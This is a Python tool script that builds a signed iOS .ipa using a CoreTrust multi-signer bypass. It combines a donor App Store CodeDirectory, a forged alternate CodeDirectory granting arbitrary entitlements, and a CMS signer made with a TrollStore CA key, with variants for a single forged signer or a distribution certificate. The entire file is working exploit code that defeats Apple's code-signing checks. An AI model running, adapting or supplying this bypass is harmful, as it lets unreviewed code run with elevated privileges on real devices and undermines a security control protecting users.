#!/usr/bin/env python3
"""Build a CoreTrust multi-signer bypass app (ChOma ct_bypass construction)
for iOS 27.2, using the App Store donor CodeDirectory/CMS from ChOma and the
TrollStore 2 CA key/cert.

Outputs a signed .ipa with:
  main CD (type 0)     = real App Store SHA1 CodeDirectory
  alternate (0x1000)   = our SHA256 CodeDirectory (arbitrary entitlements)
  CMS                  = App Store signer + TrollStore CA signer whose
                         hash-agility attrs point at our CD.
"""
import os, sys, struct, hashlib, plistlib, zipfile, shutil
from asn1crypto import cms, core
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

HERE = os.path.dirname(os.path.abspath(__file__))
PAGE = 0x1000
NSLOTS = 7
APPSTORE_TEAM = "T8ALTGMVXN"


def der_len(n):
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return bytes([0x80 | len(b)]) + b


def der_tlv(tag, body):
    return bytes([tag]) + der_len(len(body)) + body


def der_utf8(s):
    return der_tlv(0x0c, s.encode())


def der_bool(v):
    return b'\x01\x01' + (b'\xff' if v else b'\x00')


def der_ent_value(v):
    if isinstance(v, bool):
        return der_bool(v)
    if isinstance(v, str):
        return der_utf8(v)
    if isinstance(v, int):
        body = v.to_bytes(max(1, (v.bit_length() + 8) // 8), 'big', signed=True)
        return der_tlv(0x02, body)
    if isinstance(v, (list, tuple)):
        return der_tlv(0x30, b''.join(der_ent_value(x) for x in v))
    if isinstance(v, bytes):
        return der_tlv(0x04, v)
    raise TypeError(type(v))


def build_der_entitlements(ents):
    entries = b''
    for k in sorted(ents):
        entries += der_tlv(0x30, der_utf8(k) + der_ent_value(ents[k]))
    inner = b'\x02\x01\x01' + der_tlv(0xb0, entries)
    return der_tlv(0x70, inner)


def find_lc(d, cmd):
    ncmds = struct.unpack_from('<I', d, 16)[0]
    off = 32
    for _ in range(ncmds):
        c, cs = struct.unpack_from('<II', d, off)
        if c == cmd:
            return off
        off += cs
    return None


def find_segment(d, name):
    ncmds = struct.unpack_from('<I', d, 16)[0]
    off = 32
    for _ in range(ncmds):
        c, cs = struct.unpack_from('<II', d, off)
        if c == 0x19 and d[off + 8:off + 24].split(b'\0')[0] == name.encode():
            return off
        off += cs
    return None


def build_code_resources(bundle, template_path, binary_name):
    tmpl = plistlib.load(open(template_path, 'rb'))
    rules = tmpl['rules']
    rules2 = tmpl['rules2']
    files, files2 = {}, {}
    for root, dirs, names in os.walk(bundle):
        dirs[:] = [x for x in dirs if x not in ('_CodeSignature',)]
        for n in names:
            p = os.path.join(root, n)
            rel = os.path.relpath(p, bundle)
            if rel in ('_CodeSignature/CodeResources',) or rel == binary_name:
                continue
            data = open(p, 'rb').read()
            sha1 = hashlib.sha1(data).digest()
            sha256 = hashlib.sha256(data).digest()
            files[rel] = sha1
            if rel != 'Info.plist':
                files2[rel] = {'hash': sha1, 'hash2': sha256}
    out = {'files': files, 'files2': files2, 'rules': rules, 'rules2': rules2}
    return plistlib.dumps(out, fmt=plistlib.FMT_XML, sort_keys=True)


def build_cd(code, sig_off, ident, team, exec_limit, slots):
    hs = 32
    nslots = (sig_off + PAGE - 1) // PAGE
    hashes = b''
    for i in range(nslots):
        chunk = code[i * PAGE:min((i + 1) * PAGE, sig_off)]
        if len(chunk) < PAGE:
            chunk += b'\0' * (PAGE - len(chunk))
        hashes += hashlib.sha256(chunk).digest()
    ident_b = ident.encode() + b'\0'
    team_b = team.encode() + b'\0'
    ident_off = 0x58
    team_off = ident_off + len(ident_b)
    special_start = team_off + len(team_b)
    hash_off = special_start + NSLOTS * hs
    special = bytearray(NSLOTS * hs)
    for idx, val in slots.items():
        i = int(idx)
        if 1 <= i <= NSLOTS:
            special[(NSLOTS - i) * hs:(NSLOTS - i + 1) * hs] = val[:hs]
    hdr = struct.pack('>IIIIIIIII', 0xfade0c02, hash_off + len(hashes), 0x20400, 0,
                      hash_off, ident_off, NSLOTS, nslots, sig_off)
    hdr += struct.pack('>BBBB', hs, 2, 0, 12)
    hdr += struct.pack('>IIII', 0, 0, team_off, 0)
    hdr += struct.pack('>Q', 0)
    hdr += struct.pack('>QQQ', 0, exec_limit, 1)
    assert len(hdr) == 0x58, len(hdr)
    return hdr + ident_b + team_b + bytes(special) + hashes


def digest_info(oid_der, digest):
    return b'\x30' + der_len(len(oid_der) + 2 + len(digest)) + oid_der + b'\x04' + der_len(len(digest)) + digest


SHA1_OID = bytes.fromhex('06052b0e03021a')
SHA256_OID = bytes.fromhex('0609608648016503040201')


def add_bypass_signer(template_der, our_cd, appstore_cd, ca_key, ca_cert):
    ci = cms.ContentInfo.load(template_der)
    sd = ci['content']
    first = sd['signer_infos'][0]
    md = None
    for a in first['signed_attrs']:
        if a['type'].native == 'message_digest':
            md = a['values'].native[0]
    if md is None:
        raise SystemExit('no message_digest in template signer')
    sha1_app = hashlib.sha1(appstore_cd).digest()
    sha256_our = hashlib.sha256(our_cd).digest()
    xml = plistlib.dumps({'cdhashes': [sha1_app, sha256_our[:20]]}, fmt=plistlib.FMT_XML)
    der1 = digest_info(SHA1_OID, sha1_app)
    der2 = digest_info(SHA256_OID, sha256_our)
    attrs = cms.CMSAttributes([
        cms.CMSAttribute({'type': 'content_type', 'values': ['data']}),
        cms.CMSAttribute({'type': 'message_digest', 'values': [md]}),
        cms.CMSAttribute({'type': '1.2.840.113635.100.9.1',
                          'values': [core.OctetString(xml)]}),
        cms.CMSAttribute({'type': '1.2.840.113635.100.9.2',
                          'values': [core.Sequence.load(der1), core.Sequence.load(der2)]}),
    ])
    attrs = cms.CMSAttributes(sorted(list(attrs), key=lambda a: a.dump()))
    raw = attrs.dump()
    signed = b'\x31' + raw[1:] if raw[0] == 0xA0 else raw
    sig = ca_key.sign(signed, padding.PKCS1v15(), hashes.SHA256())
    ca_asn1 = x509.load_pem_x509_certificate(ca_cert) if isinstance(ca_cert, bytes) else ca_cert
    ca_asn1 = x509.load_pem_x509_certificate(open(ca_cert, 'rb').read()) if isinstance(ca_cert, str) else ca_cert
    from asn1crypto import x509 as ax509
    ca_der = ca_asn1.public_bytes(serialization.Encoding.DER)
    ca_a = ax509.Certificate.load(ca_der)
    sid = cms.SignerIdentifier({'issuer_and_serial_number': cms.IssuerAndSerialNumber({
        'issuer': ca_a.issuer, 'serial_number': ca_a.serial_number})})
    signer = cms.SignerInfo({
        'version': 'v1', 'sid': sid,
        'digest_algorithm': {'algorithm': 'sha256', 'parameters': core.Null()},
        'signed_attrs': attrs,
        'signature_algorithm': {'algorithm': 'sha256_rsa', 'parameters': core.Null()},
        'signature': sig})
    sd['signer_infos'].append(signer)
    sd['certificates'].append(ca_a)
    return ci.dump()


def add_single_signer(template_der, our_cd, appstore_cd, ca_key, ca_cert):
    """One SignerInfo (our CA), but the certificate set still carries the real
    Apple App Store chain. Security sees one signer; CoreTrust walks the certs."""
    from asn1crypto import x509 as ax509
    tci = cms.ContentInfo.load(template_der)
    tsd = tci['content']
    apple = [c.chosen for c in tsd['certificates'] if c.name == 'certificate']
    first = tsd['signer_infos'][0]
    md = hashlib.sha256(appstore_cd).digest()
    sha1_app = hashlib.sha1(appstore_cd).digest()
    sha256_our = hashlib.sha256(our_cd).digest()
    xml = plistlib.dumps({'cdhashes': [sha1_app, sha256_our[:20]]}, fmt=plistlib.FMT_XML)
    der1 = digest_info(SHA1_OID, sha1_app)
    der2 = digest_info(SHA256_OID, sha256_our)
    attrs = cms.CMSAttributes([
        cms.CMSAttribute({'type': 'content_type', 'values': ['data']}),
        cms.CMSAttribute({'type': 'message_digest', 'values': [md]}),
        cms.CMSAttribute({'type': '1.2.840.113635.100.9.1',
                          'values': [core.OctetString(xml)]}),
        cms.CMSAttribute({'type': '1.2.840.113635.100.9.2',
                          'values': [core.Sequence.load(der1), core.Sequence.load(der2)]}),
    ])
    attrs = cms.CMSAttributes(sorted(list(attrs), key=lambda a: a.dump()))
    raw = attrs.dump()
    signed = b'\x31' + raw[1:] if raw[0] == 0xA0 else raw
    sig = ca_key.sign(signed, padding.PKCS1v15(), hashes.SHA256())
    ca = x509.load_pem_x509_certificate(open(ca_cert, 'rb').read()) if isinstance(ca_cert, str) else ca_cert
    ca_a = ax509.Certificate.load(ca.public_bytes(serialization.Encoding.DER))
    sid = cms.SignerIdentifier({'issuer_and_serial_number': cms.IssuerAndSerialNumber({
        'issuer': ca_a.issuer, 'serial_number': ca_a.serial_number})})
    signer = cms.SignerInfo({
        'version': 'v1', 'sid': sid,
        'digest_algorithm': {'algorithm': 'sha256', 'parameters': core.Null()},
        'signed_attrs': attrs,
        'signature_algorithm': {'algorithm': 'sha256_rsa', 'parameters': core.Null()},
        'signature': sig})
    sd = cms.SignedData({
        'version': 'v1',
        'digest_algorithms': [{'algorithm': 'sha256', 'parameters': core.Null()}],
        'encap_content_info': {'content_type': 'data'},
        'certificates': cms.CertificateSet(apple + [ca_a]),
        'signer_infos': [signer],
    })
    return cms.ContentInfo({'content_type': 'signed_data', 'content': sd}).dump()


def add_dist_signer(template_der, our_cd, appstore_cd, dist_key, dist_leaf_der, wwdr_der):
    """One SignerInfo: our real Apple-issued distribution leaf (trusted by
    Security), while the certificate set still leads with the real App Store
    chain so CoreTrust's cert walk lands on App Store policy."""
    from asn1crypto import x509 as ax509
    tci = cms.ContentInfo.load(template_der)
    tsd = tci['content']
    apple = [c.chosen for c in tsd['certificates'] if c.name == 'certificate']
    first = tsd['signer_infos'][0]
    md = hashlib.sha256(appstore_cd).digest()
    sha1_app = hashlib.sha1(appstore_cd).digest()
    sha256_our = hashlib.sha256(our_cd).digest()
    xml = plistlib.dumps({'cdhashes': [sha1_app, sha256_our[:20]]}, fmt=plistlib.FMT_XML)
    der1 = digest_info(SHA1_OID, sha1_app)
    der2 = digest_info(SHA256_OID, sha256_our)
    attrs = cms.CMSAttributes([
        cms.CMSAttribute({'type': 'content_type', 'values': ['data']}),
        cms.CMSAttribute({'type': 'message_digest', 'values': [md]}),
        cms.CMSAttribute({'type': '1.2.840.113635.100.9.1',
                          'values': [core.OctetString(xml)]}),
        cms.CMSAttribute({'type': '1.2.840.113635.100.9.2',
                          'values': [core.Sequence.load(der1), core.Sequence.load(der2)]}),
    ])
    attrs = cms.CMSAttributes(sorted(list(attrs), key=lambda a: a.dump()))
    raw = attrs.dump()
    signed = b'\x31' + raw[1:] if raw[0] == 0xA0 else raw
    sig = dist_key.sign(signed, padding.PKCS1v15(), hashes.SHA256())
    leaf = ax509.Certificate.load(dist_leaf_der)
    wwdr = ax509.Certificate.load(wwdr_der)
    sid = cms.SignerIdentifier({'issuer_and_serial_number': cms.IssuerAndSerialNumber({
        'issuer': leaf.issuer, 'serial_number': leaf.serial_number})})
    signer = cms.SignerInfo({
        'version': 'v1', 'sid': sid,
        'digest_algorithm': {'algorithm': 'sha256', 'parameters': core.Null()},
        'signed_attrs': attrs,
        'signature_algorithm': {'algorithm': 'sha256_rsa', 'parameters': core.Null()},
        'signature': sig})
    sd = cms.SignedData({
        'version': 'v1',
        'digest_algorithms': [{'algorithm': 'sha256', 'parameters': core.Null()}],
        'encap_content_info': {'content_type': 'data'},
        'certificates': cms.CertificateSet(apple + [leaf, wwdr]),
        'signer_infos': [signer],
    })
    return cms.ContentInfo({'content_type': 'signed_data', 'content': sd}).dump()


def superblob(entries):
    hdr = 12 + 8 * len(entries)
    idx = b''
    off = hdr
    body = b''
    for t, b in entries:
        idx += struct.pack('>II', t, off)
        body += b
        off += len(b)
    return struct.pack('>III', 0xfade0cc0, hdr + len(body), len(entries)) + idx + body


def build(bundle, base_bin_path, cr_template, ents_path, out_ipa, ident=None, team=APPSTORE_TEAM, single=False, dist=False):
    info_path = os.path.join(bundle, 'Info.plist')
    info = open(info_path, 'rb').read()
    pl = plistlib.loads(info)
    ident = ident or pl['CFBundleIdentifier']
    binary_name = pl['CFBundleExecutable']
    bin_path = os.path.join(bundle, binary_name)
    shutil.copyfile(base_bin_path, bin_path)
    os.chmod(bin_path, 0o755)

    ents = plistlib.load(open(ents_path, 'rb'))
    ent_xml = plistlib.dumps(ents, fmt=plistlib.FMT_XML, sort_keys=True)
    ent_blob = struct.pack('>II', 0xfade7171, 8 + len(ent_xml)) + ent_xml
    der_payload = build_der_entitlements(ents)
    der_blob = struct.pack('>II', 0xfade7172, 8 + len(der_payload)) + der_payload
    req_blob = struct.pack('>III', 0xfade0c01, 12, 0)

    os.makedirs(os.path.join(bundle, '_CodeSignature'), exist_ok=True)
    cr = build_code_resources(bundle, cr_template, binary_name)
    open(os.path.join(bundle, '_CodeSignature', 'CodeResources'), 'wb').write(cr)

    d = open(bin_path, 'rb').read()
    lc_off = find_lc(d, 0x1d)
    if lc_off is None:
        raise SystemExit('no LC_CODE_SIGNATURE in base binary')
    old_off = struct.unpack_from('<I', d, lc_off + 8)[0]
    orig_size = struct.unpack_from('<I', d, lc_off + 12)[0]

    base = bytearray(d[:old_off])
    sig_off = (len(base) + 15) & ~15
    if len(base) < sig_off:
        base += b'\0' * (sig_off - len(base))

    text = find_segment(d, '__TEXT')
    exec_limit = struct.unpack_from('<Q', d, text + 48)[0] if text else 0x4000

    appstore_cd = open(os.path.join(HERE, 'AppStoreCodeDirectory.bin'), 'rb').read()
    template = open(os.path.join(HERE, 'AppStoreSignatureBlob.bin'), 'rb').read()[8:]
    ca_key = serialization.load_pem_private_key(open(os.path.join(HERE, 'CAKey.pem'), 'rb').read(), password=None)
    ca_cert = os.path.join(HERE, 'CACert.pem')
    dist_key = serialization.load_der_private_key(open(os.path.join(HERE, 'dist_key.der'), 'rb').read(), password=None) if dist else None
    dist_leaf_der = open(os.path.join(HERE, 'dist_leaf.der'), 'rb').read() if dist else None
    wwdr_der = open(os.path.join(HERE, 'wwdr.der'), 'rb').read() if dist else None

    def make(sb_len):
        b = bytearray(base)
        struct.pack_into('<II', b, lc_off + 8, sig_off, sb_len)
        le = find_segment(bytes(b), '__LINKEDIT')
        le_fileoff = struct.unpack_from('<Q', b, le + 40)[0]
        le_size = sig_off + sb_len - le_fileoff
        struct.pack_into('<Q', b, le + 32, (le_size + 0x3fff) & ~0x3fff)
        struct.pack_into('<Q', b, le + 48, le_size)
        code = bytes(b)
        slots = {
            1: hashlib.sha256(info).digest(),
            2: hashlib.sha256(req_blob).digest(),
            3: hashlib.sha256(cr).digest(),
            5: hashlib.sha256(ent_blob).digest(),
            7: hashlib.sha256(der_blob).digest(),
        }
        cd = build_cd(code, sig_off, ident, team, exec_limit, slots)
        if dist:
            cms_data = add_dist_signer(template, cd, appstore_cd, dist_key, dist_leaf_der, wwdr_der)
        elif single:
            cms_data = add_single_signer(template, cd, appstore_cd, ca_key, ca_cert)
        else:
            cms_data = add_bypass_signer(template, cd, appstore_cd, ca_key, ca_cert)
        cms_blob = struct.pack('>II', 0xfade0b01, 8 + len(cms_data)) + cms_data
        sb = superblob([(0, appstore_cd), (2, req_blob), (5, ent_blob), (7, der_blob),
                        (0x1000, cd), (0x10000, cms_blob)])
        return cd, sb, code

    sb_len = 0
    for _ in range(8):
        cd, sb, code = make(sb_len)
        if len(sb) == sb_len:
            break
        sb_len = len(sb)
    else:
        raise SystemExit('superblob size did not converge')

    out = bytearray(base)
    struct.pack_into('<II', out, lc_off + 8, sig_off, len(sb))
    le = find_segment(bytes(out), '__LINKEDIT')
    le_fileoff = struct.unpack_from('<Q', out, le + 40)[0]
    le_size = sig_off + len(sb) - le_fileoff
    struct.pack_into('<Q', out, le + 32, (le_size + 0x3fff) & ~0x3fff)
    struct.pack_into('<Q', out, le + 48, le_size)
    out += sb
    open(bin_path, 'wb').write(out)
    os.chmod(bin_path, 0o755)
    print('built %s size=%d sig=%#x sb=%d cd256=%s appcd_sha1=%s origsig=%d' % (
        bin_path, len(out), sig_off, len(sb), hashlib.sha256(cd).hexdigest(),
        hashlib.sha1(appstore_cd).hexdigest(), orig_size))
    make_ipa(bundle, out_ipa)
    return out


def make_ipa(bundle, out_ipa):
    root = os.path.dirname(bundle)
    top = os.path.dirname(root) if os.path.basename(root) == 'Payload' else root
    with zipfile.ZipFile(out_ipa, 'w', zipfile.ZIP_DEFLATED) as z:
        for dirpath, dirnames, filenames in os.walk(bundle):
            for f in filenames:
                p = os.path.join(dirpath, f)
                z.write(p, os.path.relpath(p, top))
    print('ipa', out_ipa)


if __name__ == '__main__':
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument('bundle')
    ap.add_argument('base_bin')
    ap.add_argument('cr_template')
    ap.add_argument('ents')
    ap.add_argument('out_ipa')
    ap.add_argument('--single', action='store_true')
    ap.add_argument('--dist', action='store_true')
    ap.add_argument('--ident')
    ap.add_argument('--team', default=APPSTORE_TEAM)
    a = ap.parse_args()
    build(a.bundle, a.base_bin, a.cr_template, a.ents, a.out_ipa, a.ident, a.team, a.single, a.dist)
